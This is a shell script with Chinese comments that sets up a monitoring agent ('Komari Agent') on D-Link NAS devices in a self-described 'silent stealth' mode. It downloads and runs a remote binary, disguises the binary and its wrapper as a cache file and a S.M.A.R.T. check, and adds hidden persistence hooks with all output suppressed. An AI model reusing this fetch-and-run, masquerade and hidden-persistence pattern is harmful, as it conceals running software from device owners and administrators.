#!/bin/sh

# Komari Agent Startup Setup Script (Silent Stealth Version)
# 用于 D-Link NAS / 嵌入式 Linux 系统 (如 NETDRIVE4T)

# === 配置区域 ===
# Agent 二进制文件路径 (伪装成临时缓存文件)
AGENT_BIN="/mnt/HD_a4/.cache_db"
# 原下载地址
DOWNLOAD_URL="https://raw.githubusercontent.com/cyclestudy/download/refs/heads/main/armv5telc"
# 启动参数
AGENT_ARGS="-e https://status.sm.uy -k 7XDP4BXGDtvsPQyCf9Asr7 -i 3"

# 实际执行启动的脚本路径 (伪装成隐藏的系统检查脚本)
START_SCRIPT="/mnt/HD_a4/.smart_drive_check.sh"

echo "=== Komari Agent Setup (Silent Stealth Mode) ==="

# 1. 创建统一的启动脚本 (完全静默模式 - 无 echo)
echo "Creating silent startup wrapper at $START_SCRIPT..."
cat << EOF > "$START_SCRIPT"
#!/bin/sh
# 延时等待网络
sleep 20

AGENT_BIN="$AGENT_BIN"
DOWNLOAD_URL="$DOWNLOAD_URL"

# 检查函数：文件是否有效 (存在且非空)
is_valid_file() {
    if [ -f "\$1" ] && [ -s "\$1" ]; then
        return 0
    else
        return 1
    fi
}

# 检查文件是否有效，无效则下载 (静默)
if ! is_valid_file "\$AGENT_BIN"; then
    rm -f "\$AGENT_BIN"
    
    # 尝试 wget (Busybox) -q 静默
    wget -q "\$DOWNLOAD_URL" -O "\$AGENT_BIN"
    
    # 如果 wget 失败，尝试 curl -s 静默
    if ! is_valid_file "\$AGENT_BIN"; then
        rm -f "\$AGENT_BIN"
        curl -sL "\$DOWNLOAD_URL" -o "\$AGENT_BIN"
    fi
    
    # 赋权
    if is_valid_file "\$AGENT_BIN"; then
        chmod +x "\$AGENT_BIN"
    else
        rm -f "\$AGENT_BIN"
    fi
fi

# 检查是否已经在运行
if ! pidof .cache_db > /dev/null && ! pidof .armv5 > /dev/null; then
    # 启动 Agent (标准输出和错误输出全部丢弃)
    if [ -x "\$AGENT_BIN" ]; then
        \$AGENT_BIN $AGENT_ARGS > /dev/null 2>&1 &
    fi
fi
EOF
chmod +x "$START_SCRIPT"
echo "[OK] Created $START_SCRIPT"

# 2. 方案 A: fun_plug (D-Link 标准机制)
FUN_PLUG="/mnt/HD_a4/fun_plug"
echo "Configuring fun_plug..."

if [ -f "$FUN_PLUG" ]; then
    if ! grep -q "$START_SCRIPT" "$FUN_PLUG"; then
        echo "" >> "$FUN_PLUG"
        echo "$START_SCRIPT > /dev/null 2>&1 &" >> "$FUN_PLUG"
        echo "[OK] Appended to existing fun_plug"
    fi
else
    # 伪装
    cat << EOF > "$FUN_PLUG"
#!/bin/sh
# fun_plug script for S.M.A.R.T check

# Execute startup checks (Silent)
$START_SCRIPT > /dev/null 2>&1 &
EOF
    chmod +x "$FUN_PLUG"
    echo "[OK] Created new fun_plug"
fi

# 3. 方案 B: rxclient_schedule (隐藏持久化 Hook)
HOOK_FILE="/usr/local/config/rxclient_schedule.sh"
echo "Configuring secondary hook..."

cat << EOF > "$HOOK_FILE"
#!/bin/sh
# Schedule RX client tasks
$START_SCRIPT > /dev/null 2>&1 &
EOF
chmod +x "$HOOK_FILE"
echo "[OK] Configured $HOOK_FILE"

echo ""
echo "=== Setup Complete ==="
echo "已移除启动过程中的所有日志输出 (echo)。"
echo "请执行 'reboot' 重启设备进行测试。"
